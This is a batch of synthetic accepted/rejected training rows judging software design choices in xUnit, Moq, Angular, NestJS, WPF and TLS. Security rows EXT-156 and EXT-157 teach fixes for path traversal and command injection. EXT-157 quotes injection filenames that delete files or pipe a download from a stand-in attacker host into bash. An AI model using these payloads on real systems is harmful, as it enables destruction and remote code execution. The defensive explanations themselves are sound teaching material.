# External Training Rows — Batch 8
## Row IDs: EXT-151 through EXT-170
## Date: 2026-05-04
## Focus: Group 8/9/11/13 continued, additional CWE entries, families 3/4/6/8 gap closure

---

## EXT-151

```json
{
  "rowId": "EXT-151",
  "sourceIds": ["XUNIT-DOTNET"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "G_LEARNING_TRAINING",
  "subdomain": "parameterized-test-design",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Arbitrate this xUnit test parameterization decision: a developer uses [InlineData] with 12 test cases for a price calculation method. Six of the test cases include complex objects (a Product with 8 properties, a Discount with 4 properties, and a Customer tier). The attribute list has become difficult to read.",
    "b": "[Theory] [InlineData('SKU-001', 100.00, 'GOLD', 0.10, 90.00)] [InlineData('SKU-002', 250.00, 'SILVER', 0.05, 237.50)] ... (10 more similar attributes) — each [InlineData] attribute has 5 primitive parameters but some cases need complex object structures that cannot fit in attribute parameters.",
    "c": "Context: xUnit [Theory] parameterization. [InlineData] is limited to compile-time constant values (primitives, strings, Type). For test cases that require object instances (class instances, complex structs), [MemberData] provides a static property or method that yields IEnumerable<object[]>, allowing full object initialization. For 12 primitive-parameter cases, [InlineData] is readable. For cases that need complex objects, [MemberData] or [ClassData] is required."
  },
  "function": "Apply testParameterizationArbiter: evaluate whether [InlineData] is appropriate for the current test cases. Identify when the threshold for [MemberData] migration is reached.",
  "acceptedOutput": {
    "decision": "ACCEPT [InlineData] for the current 6 primitive cases — but REJECT for the complex object cases that are still being added.",
    "analysis": "[InlineData] is appropriate for test cases whose parameters are primitive types or strings: [InlineData('SKU-001', 100.00, 'GOLD', 0.10, 90.00)] is readable and maintainable. The threshold for migration to [MemberData] is: (1) any parameter that is a class instance (Product, Discount, Customer — these cannot be [InlineData] parameters at all), or (2) more than 6-7 parameters making the attribute line unwrappable. The 6 currently-primitive cases may stay as [InlineData]. The new complex object cases must use [MemberData].",
    "reprocessInstruction": "For the complex cases: public static IEnumerable<object[]> ComplexPriceTestCases() { yield return new object[] { new Product { Sku = 'SKU-C01', ... }, new Discount { Rate = 0.15m, ... }, CustomerTier.Gold, 127.50m }; } [Theory] [MemberData(nameof(ComplexPriceTestCases))] public void Calculate_WithDiscount_ReturnsExpected(Product product, Discount discount, CustomerTier tier, decimal expected) { ... }"
  },
  "rejectedOutput": {
    "decision": "REJECT [InlineData] entirely. All test cases should use [MemberData] for consistency."
  },
  "arbiters": ["testParameterizationArbiter"],
  "whyAccepted": "Consistency is a valid goal but not a reason to complicate readable primitive cases with [MemberData] scaffolding. [InlineData] is the correct tool for simple primitive test cases. [MemberData] is the correct tool for complex object cases. Using the right tool for each case type is better than uniform use of the more complex tool.",
  "whyRejected": "The rejected output applies a consistency rule without evaluating fitness for purpose. Six primitive-parameter test cases are clearer as [InlineData] than as [MemberData] with static IEnumerable methods.",
  "sourceAnchors": [
    {
      "sourceId": "XUNIT-DOTNET",
      "url": "https://github.com/xunit/xunit",
      "section": "[Theory] parameterization — [InlineData] for primitives, [MemberData] for complex objects",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-152

```json
{
  "rowId": "EXT-152",
  "sourceIds": ["MOQ"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "G_LEARNING_TRAINING",
  "subdomain": "mock-verification",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Arbitrate this Moq mock verification result: a test sets up a mock email service and calls .Verifiable() on the Setup. After the Act, the test does not call mockEmailService.Verify(). The test passes even when the email service method is never called.",
    "b": "var mockEmail = new Mock<IEmailService>(); mockEmail.Setup(s => s.Send(It.IsAny<string>(), It.IsAny<string>())).Verifiable(); // Act: orderService.PlaceOrder(order); // No mockEmail.Verify() call — Verifiable() sets up the expectation but doesn't verify it was met.",
    "c": "Context: Moq .Verifiable() marks a setup as expected-to-be-called. But .Verifiable() alone does not enforce the expectation — mockEmail.Verify() (or mockEmail.VerifyAll()) must be called after the Act to check that all Verifiable setups were invoked. Without the Verify() call, the test does not fail if the email is never sent, making it a false positive test."
  },
  "function": "Apply mockVerificationArbiter: detect .Verifiable() setups with no corresponding .Verify() or .VerifyAll() call. Identify the false positive risk.",
  "acceptedOutput": {
    "decision": "REJECT. .Verifiable() without .Verify() is a false positive test. The test will pass whether or not IEmailService.Send() is called. If the developer changes PlaceOrder() to skip email sending, the test continues to pass — the verification that 'an email is sent when an order is placed' has no enforcement. The test provides false confidence.",
    "reprocessInstruction": "Add verification after the Act: mockEmail.VerifyAll(); — this checks that all Verifiable setups were called at least once. Alternatively, use mockEmail.Verify(s => s.Send(It.IsAny<string>(), It.IsAny<string>()), Times.Once) to verify the exact call count. Choose VerifyAll() for verifying all setups; use Verify() with Times for specific call count assertions."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. .Verifiable() marks the method call as expected. If the method is not called, the test will fail."
  },
  "arbiters": ["mockVerificationArbiter"],
  "whyAccepted": "The rejected output's claim is incorrect. .Verifiable() sets an expectation but does not enforce it without Verify(). This is a documented Moq behavior: 'Call Verify or VerifyAll on the mock to check that all verifiable expectations were met.' Without that call, no failure occurs.",
  "whyRejected": "The rejected output describes what would happen if Moq enforced .Verifiable() automatically — but it does not. The test will pass without the Verify() call regardless of whether Send() was called.",
  "sourceAnchors": [
    {
      "sourceId": "MOQ",
      "url": "https://github.com/devlooped/moq",
      "section": "Verifiable() and VerifyAll() — expectation setup requires explicit Verify() call for enforcement",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-153

```json
{
  "rowId": "EXT-153",
  "sourceIds": ["ANGULAR-COMPONENTS"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineCommand_to_machineActionItems",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "angular-overlay",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Decompose this Angular UI requirement: add a confirmation dialog that appears when the user clicks 'Delete Account'. The dialog must: overlay the entire page, prevent interaction with background content, show a title, a description, and Cancel/Confirm buttons, and be keyboard-dismissible (Escape key).",
    "b": "The application uses Angular Material (CDK). Available: MatDialog service (wraps CDK Overlay with Material styling), CDK Overlay directly, or a custom <div class='modal'> positioned with CSS.",
    "c": "Context: Angular CDK and Angular Material. MatDialog is the correct tool for this requirement — it wraps CDK Overlay with ARIA semantics (role='dialog', aria-modal='true'), focus trap, and Escape key handling built in. CDK Overlay directly requires implementing all of these manually. CSS modal requires implementing all plus the overlay positioning. MatDialog reduces implementation to component definition and dialog open call."
  },
  "function": "Produce the action items for implementing the Delete Account confirmation dialog using MatDialog. Include the dialog component definition and the trigger.",
  "acceptedOutput": {
    "actionItems": [
      "Action 1: Create a ConfirmDeleteDialogComponent: @Component({ template: '<h2 mat-dialog-title>Delete account?</h2><mat-dialog-content>This action cannot be undone.</mat-dialog-content><mat-dialog-actions><button mat-button (click)=\"dialogRef.close(false)\">Cancel</button><button mat-raised-button color=\"warn\" (click)=\"dialogRef.close(true)\">Delete</button></mat-dialog-actions>' }) export class ConfirmDeleteDialogComponent { constructor(public dialogRef: MatDialogRef<ConfirmDeleteDialogComponent>) {} }",
      "Action 2: Inject MatDialog in the parent component: constructor(private dialog: MatDialog) {}",
      "Action 3: Open the dialog on button click: const dialogRef = this.dialog.open(ConfirmDeleteDialogComponent, { disableClose: false, ariaLabel: 'Delete account confirmation' }); dialogRef.afterClosed().subscribe(confirmed => { if (confirmed) this.accountService.delete(); });",
      "Action 4: Escape key dismissal is built into MatDialog by default (disableClose: false). No additional Escape key handler required.",
      "Action 5: Add ConfirmDeleteDialogComponent to the NgModule declarations. No CDK Overlay, custom focus trap, or ARIA attributes are needed — MatDialog provides all of these."
    ]
  },
  "rejectedOutput": {
    "actionItems": [
      "Add a <div class='modal-overlay'> to the template.",
      "Show/hide with ngIf.",
      "Bind the Cancel button to a dismiss method."
    ]
  },
  "arbiters": ["uiComponentSelectionArbiter"],
  "whyAccepted": "MatDialog provides ARIA semantics, focus trap, and Escape key handling without additional implementation. The accepted decomposition specifies the exact Angular Material approach that meets all five requirements with minimal custom code.",
  "whyRejected": "The CSS modal approach requires custom ARIA attributes (role=dialog, aria-modal=true), manual focus trap implementation, Escape key binding, and overlay positioning. Each of these is a separate implementation task. MatDialog provides all of them out of the box.",
  "sourceAnchors": [
    {
      "sourceId": "ANGULAR-COMPONENTS",
      "url": "https://github.com/angular/components",
      "section": "MatDialog — CDK Overlay wrapper with ARIA, focus trap, and Escape key handling",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-154

```json
{
  "rowId": "EXT-154",
  "sourceIds": ["NESTJS-DOCS"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "A_TOPOLOGY",
  "subdomain": "nestjs-interceptor-vs-middleware",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Arbitrate this NestJS architecture decision: a developer implemented response envelope wrapping (wrapping all API responses in { success: true, data: <original_response>, timestamp: ISO8601 }) as a Middleware rather than as an Interceptor.",
    "b": "@Injectable() export class EnvelopeMiddleware implements NestMiddleware { use(req: Request, res: Response, next: NextFunction) { const originalJson = res.json.bind(res); res.json = (body) => { return originalJson({ success: true, data: body, timestamp: new Date().toISOString() }); }; next(); } } — Middleware patches res.json to wrap responses.",
    "c": "Context: NestJS request pipeline — Middleware → Guard → Interceptor → Pipe → Controller → Interceptor (post) → Exception Filter. Middleware runs before Guards and Interceptors and has access only to the raw Express req/res. Interceptors run after the controller and have access to the ExecutionContext and the response stream via RxJS observables. Response transformation belongs in the post-controller Interceptor phase — it is a cross-cutting concern that modifies what the controller returned."
  },
  "function": "Apply nestjsPipelinePhaseArbiter: evaluate whether response transformation in Middleware is correct or whether it belongs in an Interceptor.",
  "acceptedOutput": {
    "decision": "REJECT — Middleware is the wrong pipeline phase for response transformation. The Middleware approach patches res.json (Express-level), which: (1) runs before Guards — if a Guard rejects the request, the patched res.json would wrap the 401/403 response in { success: true, data: ... }, producing a semantically incorrect envelope on an error response; (2) bypasses NestJS exception filters — if an exception filter returns a structured error, the Middleware wraps it again; (3) is tightly coupled to Express — the Middleware would not work with a Fastify adapter.",
    "reprocessInstruction": "@Injectable() export class EnvelopeInterceptor implements NestInterceptor { intercept(context: ExecutionContext, next: CallHandler): Observable<any> { return next.handle().pipe(map(data => ({ success: true, data, timestamp: new Date().toISOString() }))); } } Apply as @UseInterceptors(EnvelopeInterceptor) at the controller or globally via app.useGlobalInterceptors(). The Interceptor runs post-controller, after Guards succeed and before response serialization — it only wraps successful responses."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The Middleware achieves the desired envelope wrapping by patching res.json. It applies globally to all routes."
  },
  "arbiters": ["nestjsPipelinePhaseArbiter"],
  "whyAccepted": "Global application does not equal correct phase placement. The Middleware wraps error responses from Guards and exception filters as { success: true, data: 401 body }, which is incorrect. The Interceptor only runs on successful controller responses — it cannot be triggered on Guard-rejected requests.",
  "whyRejected": "The rejected output evaluates the happy path (request succeeds, controller returns data, res.json is patched, envelope is applied) without evaluating the Guard rejection path and exception filter path where the Middleware produces incorrect envelopes.",
  "sourceAnchors": [
    {
      "sourceId": "NESTJS-DOCS",
      "url": "https://github.com/nestjs/docs.nestjs.com",
      "section": "Interceptors — response mapping with RxJS map(); post-controller vs middleware pipeline phase",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-155

```json
{
  "rowId": "EXT-155",
  "sourceIds": ["MERMAID"],
  "sourceTrustTier": 1,
  "datasetFamily": "finalMachineResults_to_userFormat",
  "domain": "H_GOVERNANCE",
  "subdomain": "flowchart-formatting",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Format this approved deployment decision result as a Mermaid flowchart. The flow: an incoming deployment request is validated; if validation fails, it is rejected immediately; if validation passes, a canary deployment is started; the canary is monitored for 30 minutes; if metrics are healthy, the rollout continues to 100%; if metrics are degraded, the canary is rolled back.",
    "b": "Approved result: { flow: 'Deploy → Validate → [fail: Reject | pass: Canary] → Monitor 30min → [healthy: Full Rollout | degraded: Rollback] }",
    "c": "Context: Mermaid flowchart syntax. Decision nodes use {diamond shape}. Process nodes use [rectangle]. Terminal nodes (Reject, Full Rollout success, Rollback complete) use ([rounded rectangle]) or ((circle)). The two conditional branches from Validate and from Monitor are decision points."
  },
  "function": "Format the deployment flow as a Mermaid flowchart. Use correct node shapes for decisions and processes. Include edge labels for the conditional branches.",
  "acceptedOutput": {
    "diagramSource": "flowchart TD\n    A[Deployment Request] --> B{Validate}\n    B -->|fail| C([Reject])\n    B -->|pass| D[Start Canary Deployment]\n    D --> E[Monitor — 30 minutes]\n    E --> F{Metrics Check}\n    F -->|healthy| G([Full Rollout — 100%])\n    F -->|degraded| H([Rollback Canary])"
  },
  "rejectedOutput": {
    "diagramSource": "flowchart TD\n    Deployment Request --> Validate\n    Validate --> Reject\n    Validate --> Canary\n    Canary --> Monitor\n    Monitor --> Full Rollout\n    Monitor --> Rollback"
  },
  "arbiters": ["diagramFormattingArbiter"],
  "whyAccepted": "The accepted diagram: uses {braces} for decision nodes (Validate, Metrics Check), uses [brackets] for process nodes, uses ([rounded]) for terminal nodes, includes edge labels (fail/pass, healthy/degraded) that explain the branch conditions. The shape vocabulary communicates node type semantically.",
  "whyRejected": "The rejected diagram uses only the default rectangle node shape for all nodes including decisions. No edge labels on conditional branches — a reader cannot tell which branch is the success path and which is the failure path. Decision nodes look identical to process nodes.",
  "sourceAnchors": [
    {
      "sourceId": "MERMAID",
      "url": "https://github.com/mermaid-js/mermaid",
      "section": "Flowchart — node shapes (rectangle, diamond, rounded); edge labels for conditional branches",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-156

```json
{
  "rowId": "EXT-156",
  "sourceIds": ["CWE-TOP25"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "path-traversal",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this file serving result: a Node.js endpoint allows authenticated users to download their invoices by filename. The filename is taken from the URL parameter and joined with the invoices directory path using path.join().",
    "b": "app.get('/invoices/:filename', authenticate, (req, res) => { const filePath = path.join('/var/invoices', req.params.filename); res.download(filePath); }); — a request to /invoices/../../etc/passwd would result in path.join('/var/invoices', '../../etc/passwd') = '/etc/passwd'.",
    "c": "Context: CWE-22 Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) — rank 8 in CWE Top 25 2023. path.join() resolves '..' components, allowing the user to escape the /var/invoices directory. An authenticated user can read any file readable by the Node.js process. Authentication is irrelevant — the vulnerability allows any authenticated user to traverse outside the intended directory."
  },
  "function": "Apply pathTraversalArbiter: detect path.join() with user-supplied components without path containment verification. Produce the correct containment check.",
  "acceptedOutput": {
    "decision": "REJECT. CWE-22 path traversal. path.join('/var/invoices', '../../etc/passwd') resolves to '/etc/passwd'. Authentication does not prevent traversal — it only requires the user to be logged in before they can read any file on the filesystem. An authenticated attacker can enumerate /etc/shadow, application configuration files, private keys, and any other file accessible to the Node.js process.",
    "reprocessInstruction": "After path.join(), verify the resolved path starts with the intended directory: const filePath = path.resolve('/var/invoices', req.params.filename); if (!filePath.startsWith(path.resolve('/var/invoices') + path.sep)) { return res.status(400).end(); } res.download(filePath); path.resolve() resolves all '..' components to an absolute path. The startsWith check verifies containment. path.sep ensures '/var/invoicesevil' is not matched by startsWith('/var/invoices')."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The endpoint requires authentication, so only authorized users can access the invoice download feature."
  },
  "arbiters": ["pathTraversalArbiter"],
  "whyAccepted": "Authentication controls who can use the feature — it does not control what files the feature can return. The vulnerability is in the file path construction, not in who can reach the endpoint. An authenticated attacker is still an attacker when it comes to path traversal.",
  "whyRejected": "The rejected output conflates authorization (user is authenticated — only intended users can call the endpoint) with input validation (what filenames are permitted — all filenames including traversal sequences are accepted). These are independent controls.",
  "sourceAnchors": [
    {
      "sourceId": "CWE-TOP25",
      "url": "https://cwe.mitre.org/data/definitions/22.html",
      "section": "CWE-22 Path Traversal — path.join with user input; path.resolve + startsWith containment check",
      "license": "MITRE CWE Terms of Use",
      "requiredNotice": "CWE™ is a trademark of The MITRE Corporation"
    }
  ],
  "licenseConstraint": "MITRE notice required",
  "trainingStatus": "candidate"
}
```

---

## EXT-157

```json
{
  "rowId": "EXT-157",
  "sourceIds": ["CWE-TOP25"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "command-injection",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this result: a Python script converts uploaded image files by running ImageMagick's convert command. The uploaded filename is included in the shell command string.",
    "b": "import subprocess; filename = request.files['image'].filename; subprocess.run(f'convert {filename} output.png', shell=True) — user-supplied filename is interpolated into a shell command with shell=True.",
    "c": "Context: CWE-77 Improper Neutralization of Special Elements used in a Command (Command Injection) — rank 5 in CWE Top 25 2023. With shell=True, the subprocess call passes the string to /bin/sh. A filename of 'image.jpg; rm -rf /' would execute: convert image.jpg; rm -rf /. The shell interprets the semicolon as a command separator. Alternative injection vectors: filename='$(curl attacker.com | bash)', filename='`whoami`'."
  },
  "function": "Apply commandInjectionArbiter: detect subprocess.run() with shell=True and user-supplied string interpolation. Produce the safe argument list pattern.",
  "acceptedOutput": {
    "decision": "REJECT. CWE-77 command injection. subprocess.run() with shell=True executes the string through /bin/sh. User-controlled filename is interpolated directly — any shell metacharacter (;, |, &&, $(), backtick) in the filename is interpreted by the shell. An attacker can execute arbitrary commands with the permissions of the web server process.",
    "reprocessInstruction": "Use subprocess.run() with a list argument and shell=False: import os; from pathlib import Path; filename = Path(request.files['image'].filename).name; if not filename.endswith(('.jpg', '.jpeg', '.png', '.gif')): abort(400); safe_input = f'/tmp/uploads/{filename}'; subprocess.run(['convert', safe_input, 'output.png'], shell=False, check=True). With shell=False and a list: the first element is the executable, subsequent elements are arguments — no shell metacharacter interpretation. Also validate and sanitize the filename to prevent path traversal in the input path."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The application only accepts image file uploads. The filename is the user's own filename — they control it already."
  },
  "arbiters": ["commandInjectionArbiter"],
  "whyAccepted": "The user controlling their own filename is not a security argument — it is the attack vector description. An attacker will supply a malicious filename precisely because they control it. 'They already control it' is true of all injection vulnerabilities.",
  "whyRejected": "The rejected output confuses 'the attacker controls the input' (true — this is always the case in injection attacks) with 'therefore the input is safe' (false — the input is dangerous because the attacker controls it).",
  "sourceAnchors": [
    {
      "sourceId": "CWE-TOP25",
      "url": "https://cwe.mitre.org/data/definitions/77.html",
      "section": "CWE-77 Command Injection — shell=True interpolation; list argument with shell=False as safe pattern",
      "license": "MITRE CWE Terms of Use",
      "requiredNotice": "CWE™ is a trademark of The MITRE Corporation"
    }
  ],
  "licenseConstraint": "MITRE notice required",
  "trainingStatus": "candidate"
}
```

---

## EXT-158

```json
{
  "rowId": "EXT-158",
  "sourceIds": ["WPF-SAMPLES"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "wpf-thread-model",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this WPF result: a background Task fetches data from an API and directly updates an ObservableCollection that is bound to a ListBox in the UI.",
    "b": "private async Task LoadDataAsync() { var items = await _apiClient.GetItemsAsync(); foreach (var item in items) { _items.Add(item); // _items is ObservableCollection<Item> bound to ListBox } } — ObservableCollection.Add() is called from the awaited continuation which may run on a thread pool thread.",
    "c": "Context: WPF threading model. WPF controls and their bound ObservableCollections have thread affinity — they must be updated from the UI thread (Dispatcher thread). After 'await _apiClient.GetItemsAsync()', the continuation runs on the captured SynchronizationContext. In a WPF application with the default SynchronizationContext, await continuations return to the UI thread. However, if SynchronizationContext.Current is null (e.g., called from a constructor or a non-UI thread), the continuation runs on a thread pool thread, causing an InvalidOperationException: 'The calling thread cannot access this object because a different thread owns it.'"
  },
  "function": "Apply wpfThreadArbiter: evaluate whether the ObservableCollection update is thread-safe and identify the conditions under which it fails.",
  "acceptedOutput": {
    "decision": "CONDITIONAL REJECT. The code is correct when called from a UI event handler (SynchronizationContext is captured, continuation returns to UI thread). The code fails when called from a non-UI context (constructor, background timer callback, or any code where SynchronizationContext.Current is null) — the continuation runs on a thread pool thread and ObservableCollection.Add() throws InvalidOperationException.",
    "reprocessInstruction": "Use Dispatcher.InvokeAsync to guarantee UI thread dispatch regardless of calling context: var items = await _apiClient.GetItemsAsync(); await Application.Current.Dispatcher.InvokeAsync(() => { foreach (var item in items) _items.Add(item); }); This is safe from any thread. Alternatively, use ConfigureAwait(true) explicitly (it is the default in WPF but explicit documentation helps): var items = await _apiClient.GetItemsAsync().ConfigureAwait(true); — but Dispatcher.InvokeAsync is more explicit and works even when SynchronizationContext is missing."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The async/await pattern in C# automatically marshals continuations back to the UI thread in WPF applications."
  },
  "arbiters": ["wpfThreadArbiter"],
  "whyAccepted": "The automatic UI thread marshal claim is conditionally true — it depends on SynchronizationContext.Current being set when the await is reached. This is true for UI event handlers. It is not true for constructors, background service callbacks, or code called from non-UI threads. The unconditional claim is incorrect.",
  "whyRejected": "The rejected output presents a conditional guarantee as unconditional. The automatic UI thread dispatch is a SynchronizationContext feature, not a WPF feature — it works when the SynchronizationContext is set correctly, which is not guaranteed in all calling contexts.",
  "sourceAnchors": [
    {
      "sourceId": "WPF-SAMPLES",
      "url": "https://github.com/microsoft/WPF-Samples",
      "section": "Threading model — ObservableCollection thread affinity; Dispatcher.InvokeAsync for cross-thread updates",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-159

```json
{
  "rowId": "EXT-159",
  "sourceIds": ["NESTJS-CORE"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineActionItem_to_domainResult",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "function-implementation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Implement a NestJS service method: processPaymentAndNotify(orderId: string, amount: number): Promise<OperationResult>. It must: (1) process the payment via PaymentService.charge(orderId, amount), (2) if charge succeeds, send a confirmation notification via NotificationService.sendConfirmation(orderId), (3) if charge fails, return a failure result without sending a notification, (4) if notification fails after a successful charge, return a partial success result — the charge succeeded but notification failed.",
    "b": "PaymentService.charge() returns Promise<ChargeResult>: { success: boolean, transactionId?: string, error?: string }. NotificationService.sendConfirmation() returns Promise<boolean>. Both can throw.",
    "c": "Context: NestJS service — multi-step operation with independent failure handling. The charge and notification have different failure semantics: charge failure = full failure; notification failure after charge = partial success (the payment completed, the notification is a secondary concern)."
  },
  "function": "Implement processPaymentAndNotify with the correct three-outcome result structure.",
  "acceptedOutput": {
    "implementation": "async processPaymentAndNotify(orderId: string, amount: number): Promise<OperationResult> {\n  let chargeResult: ChargeResult;\n  try {\n    chargeResult = await this.paymentService.charge(orderId, amount);\n  } catch (err) {\n    return OperationResult.Fail(`Payment service error: ${err.message}`, 'PAYMENT_SERVICE_ERROR');\n  }\n  if (!chargeResult.success) {\n    return OperationResult.Fail(chargeResult.error ?? 'Charge declined', 'CHARGE_DECLINED');\n  }\n  let notified = false;\n  try {\n    notified = await this.notificationService.sendConfirmation(orderId);\n  } catch {\n    // notification failure is non-fatal — charge succeeded\n  }\n  if (!notified) {\n    return OperationResult.PartialSuccess(\n      chargeResult.transactionId!,\n      'Payment succeeded but confirmation notification failed'\n    );\n  }\n  return OperationResult.Ok(chargeResult.transactionId!);\n}",
    "outcomeMap": "charge throws → Fail(PAYMENT_SERVICE_ERROR); charge returns success:false → Fail(CHARGE_DECLINED); charge ok + notify fails → PartialSuccess; charge ok + notify ok → Ok"
  },
  "rejectedOutput": {
    "implementation": "async processPaymentAndNotify(orderId: string, amount: number): Promise<OperationResult> {\n  const charge = await this.paymentService.charge(orderId, amount);\n  await this.notificationService.sendConfirmation(orderId);\n  return OperationResult.Ok(charge.transactionId);\n}"
  },
  "arbiters": ["implementationCorrectnessArbiter"],
  "whyAccepted": "The accepted implementation: separates the three failure modes with distinct result codes; catches charge errors without propagating them as uncaught exceptions; treats notification failure as non-fatal with PartialSuccess; returns the transactionId in all non-Fail outcomes.",
  "whyRejected": "The rejected implementation: does not check chargeResult.success (accepts declined charges); does not handle notification failure (throws uncaught exception on notification error); does not implement the PartialSuccess path.",
  "sourceAnchors": [
    {
      "sourceId": "NESTJS-CORE",
      "url": "https://github.com/nestjs/nest",
      "section": "Service layer — multi-step operation with independent success/failure semantics",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-160

```json
{
  "rowId": "EXT-160",
  "sourceIds": ["OWASP-ASVS"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "api-transport-security",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this API transport security result: a REST API serves all endpoints over HTTPS. However, the API documentation advertises both http:// and https:// URLs as valid endpoints. The application server accepts HTTP on port 80 and redirects to HTTPS, but the redirect is a 301 (permanent) with no HSTS header.",
    "b": "Server configuration: port 80 → 301 redirect to https:// endpoint. No Strict-Transport-Security header on the HTTPS response. API clients are SDK-based (not browser). The SDK documentation shows examples using http:// URLs.",
    "c": "Context: OWASP ASVS V9.1 — Communications Security. V9.1.1: TLS must be used for all client connections. V9.1.3: The application must redirect HTTP to HTTPS. V9.1.4: HSTS must be configured with a minimum max-age of one year. SDK clients that follow http:// documentation examples send the first request over unencrypted HTTP — the redirect to HTTPS happens only after the plaintext request is observed by any network observer."
  },
  "function": "Apply tlsConfigArbiter: evaluate whether the HTTP-to-HTTPS redirect with no HSTS meets ASVS V9.1 communications security requirements.",
  "acceptedOutput": {
    "decision": "REJECT — two ASVS V9.1 violations. Violation 1 (V9.1.1 + V9.1.4): No HSTS header. HSTS (Strict-Transport-Security) instructs TLS-capable clients to only connect via HTTPS for the specified max-age. Without HSTS, every SDK client that initiates an http:// request (as shown in the documentation examples) sends credentials, tokens, or request bodies in plaintext before receiving the redirect. The redirect resolves the transport issue for subsequent requests, but the first request is unencrypted. Violation 2: Documentation advertises http:// URLs, actively directing SDK users to initiate unencrypted connections.",
    "reprocessInstruction": "Fix 1: Add HSTS header to all HTTPS responses: Strict-Transport-Security: max-age=31536000; includeSubDomains. This causes TLS-capable clients to always use HTTPS after the first successful HTTPS connection. Fix 2: Remove all http:// URLs from SDK documentation. All examples must use https://. Fix 3: For API SDKs, default the base URL to https:// in the SDK constructor — require explicit opt-in to override to http:// (for local development only)."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The server redirects all HTTP traffic to HTTPS. TLS is enforced at the redirect layer."
  },
  "arbiters": ["tlsConfigArbiter"],
  "whyAccepted": "301 redirect enforces HTTPS for the second and subsequent requests from a client that remembers the redirect. It does not protect the first request — credentials sent in the first http:// request are in plaintext. HSTS prevents the first request from being sent in plaintext.",
  "whyRejected": "The rejected output evaluates only whether TLS is eventually used (true — the redirect sends the client to HTTPS). It does not evaluate whether the initial http:// request is protected (false — it is plaintext before the redirect is received).",
  "sourceAnchors": [
    {
      "sourceId": "OWASP-ASVS",
      "url": "https://github.com/OWASP/ASVS",
      "section": "V9.1 Communications Security — HSTS max-age requirement; HTTP plaintext first-request exposure",
      "license": "CC-BY-SA-4.0"
    }
  ],
  "licenseConstraint": "CC-BY-SA-4.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-161

```json
{
  "rowId": "EXT-161",
  "sourceIds": ["BIGCODEBENCH"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineActionItem_to_domainResult",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "function-implementation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Implement: validate_config(config: dict, schema: dict) -> list[str]. Validates config against schema. Schema format: { 'field_name': { 'type': 'str'|'int'|'bool'|'list', 'required': bool, 'min': int|None, 'max': int|None } }. Returns a list of error strings. Empty list means valid. For 'int' fields: 'min' and 'max' are inclusive bounds. For 'str' fields: 'min' and 'max' are min/max length.",
    "b": "Test: validate_config({'port': 8080, 'host': 'localhost'}, {'port': {'type': 'int', 'required': True, 'min': 1, 'max': 65535}, 'host': {'type': 'str', 'required': True, 'min': 1, 'max': None}}) == []. validate_config({'port': 99999}, {'port': {'type': 'int', 'required': True, 'min': 1, 'max': 65535}, 'host': {'type': 'str', 'required': True, 'min': 1, 'max': None}}) == ['port: value 99999 exceeds max 65535', 'host: required field missing'].",
    "c": "Context: BigCodeBench configuration validation task. The function must handle: (1) required field absence, (2) type mismatch, (3) numeric range (inclusive), (4) string length range, (5) returning all errors, not stopping on first. 'max': None means no upper bound."
  },
  "function": "Implement validate_config that collects all errors (not early-exit) and handles all four field types with optional bounds.",
  "acceptedOutput": {
